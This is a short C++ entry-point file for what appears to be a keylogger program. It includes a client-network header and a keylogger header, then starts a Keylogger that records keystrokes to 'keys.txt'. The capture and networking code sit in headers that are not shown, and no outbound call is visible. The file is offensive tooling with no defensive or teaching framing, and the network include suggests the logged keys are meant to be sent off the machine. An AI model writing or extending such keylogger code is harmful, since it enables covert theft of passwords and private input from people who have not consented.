#include"../lib/ClientNetwork.hpp"
#include "../lib/Keylogger.hpp"
#include <iostream>

int main() {
    std::string filename = "keys.txt";

    Keylogger keylogger(filename);
    keylogger.Run();
    return 0;
}

